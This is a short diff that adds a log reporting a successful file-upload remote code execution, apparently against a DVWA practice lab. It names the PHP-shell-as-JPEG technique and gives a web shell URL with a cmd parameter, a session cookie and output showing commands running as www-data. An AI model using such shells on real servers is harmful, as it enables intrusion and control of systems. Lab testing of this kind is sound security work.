@@ -1,0 +1,7 @@
+File Upload RCE thành công.
+      - Technique  : PHP shell as JPEG
+      - Filename   : shell.php
+      - Upload URL : http://13.250.120.1:80/vulnerabilities/upload/
+      - Shell URL  : http://13.250.120.1:80/hackable/uploads/shell.php?cmd=id
+      - Cookie     : security=low; PHPSESSID=kmbt98j2sk7qi9lun4m4l5brq2
+      - CMD Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
